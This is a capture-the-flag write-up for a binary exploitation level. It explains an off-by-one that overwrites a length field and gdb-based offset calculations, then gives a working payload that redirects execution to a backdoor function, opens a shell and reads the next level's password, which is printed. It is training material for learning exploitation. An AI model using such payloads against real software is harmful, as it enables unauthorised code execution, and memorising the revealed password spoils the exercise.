## Project README: Finding flag08


### Analysis

We have a dead code that will call system.

So we actually have a 140 buffer for the msg a 40 buffer for the username and an int for the size to write

So in memory the structure will look like this in the stack
[              MSG          ][   USERNAME   ][Size]
And every this is protected exept one thing :
```C
for ( i = 0; i <= 40 && s[i]; ++i )
		*(_BYTE *)(str + i + 140) = s[i];
```
Because of this i <= 40 we can write 1 more byte that we supposed to be allowed.
So because everything is after each other. If we write 41 char we are actually going to write 1 byte in the size so we can modify the size that is going to be copied here :
```C
return strncpy((char *)str, s, *(int *)(str + 180));
```
And after we can put 255 in hex so we have a bigger size and so a buffer overflow. We just need to find an adress to put our dead code.

### Progress


```Bash
Dump of assembler code for function handle_msg:
	0x00005555555548c0 <+0>:	push   rbp
	0x00005555555548c1 <+1>:	mov    rbp,rsp
	0x00005555555548c4 <+4>:	sub    rsp,0xc0
	0x00005555555548cb <+11>:	lea    rax,[rbp-0xc0]
	0x00005555555548d2 <+18>:	add    rax,0x8c
	0x00005555555548d8 <+24>:	mov    QWORD PTR [rax],0x0
	0x00005555555548df <+31>:	mov    QWORD PTR [rax+0x8],0x0
	0x00005555555548e7 <+39>:	mov    QWORD PTR [rax+0x10],0x0
	0x00005555555548ef <+47>:	mov    QWORD PTR [rax+0x18],0x0
	0x00005555555548f7 <+55>:	mov    QWORD PTR [rax+0x20],0x0
	0x00005555555548ff <+63>:	mov    DWORD PTR [rbp-0xc],0x8c
	0x0000555555554906 <+70>:	lea    rax,[rbp-0xc0]
	0x000055555555490d <+77>:	mov    rdi,rax
	0x0000555555554910 <+80>:	call   0x5555555549cd <set_username>
	0x0000555555554915 <+85>:	lea    rax,[rbp-0xc0]
	0x000055555555491c <+92>:	mov    rdi,rax
	0x000055555555491f <+95>:	call   0x555555554932 <set_msg>
	0x0000555555554924 <+100>:	lea    rdi,[rip+0x295]
	0x000055555555492b <+107>:	call   0x555555554730 <puts@plt>
	0x0000555555554930 <+112>:	leave
	0x0000555555554931 <+113>:	ret
```
to find the adress of our buffer let's possition ourself after the set msg and print rax. Also let's print rip that his our saved adress that will jump when ret is call.

```Bash
(gdb) b *0x0000555555554924
Breakpoint 2 at 0x555555554924
(gdb) run
Single stepping until exit from function main,
which has no line number information.
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: Pierrick
>: Welcome, Pierrick
>: Msg @Unix-Dude
>>: Test

Breakpoint 2, 0x0000555555554924 in handle_msg ()
(gdb) x $rax
0x7fffffffe510:	0x74736554
(gdb) info frame
Stack level 0, frame at 0x7fffffffe5e0:
 rip = 0x555555554924 in handle_msg; saved rip 0x555555554abd
 called by frame at 0x7fffffffe5f0
 Arglist at 0x7fffffffe5d0, args:
 Locals at 0x7fffffffe5d0, Previous frame's sp is 0x7fffffffe5e0
 Saved registers:
  rbp at 0x7fffffffe5d0, rip at 0x7fffffffe5d8
```

let's calcul the differentce now :
``` Bash
(gdb) p 0x7fffffffe5d8 - 0x7fffffffe510
$3 = 200
(gdb) i func
...
0x000055555555488c  secret_backdoor (\x8c\x48\x55\x55\x55\x55\x00\x00)
...
```
So our eip adress si 200 char after our msgbuffer.
Ok so let's build the payload

```Bash
(python -c 'print("A" * 40 + "\xff" + "\n" + "a" * 200 + "\x8c\x48\x55\x55\x55\x55\x00\x00" + "\n" + "/bin/sh")';cat) | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!
whoami
end
cd ..
cd end
cat .pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```

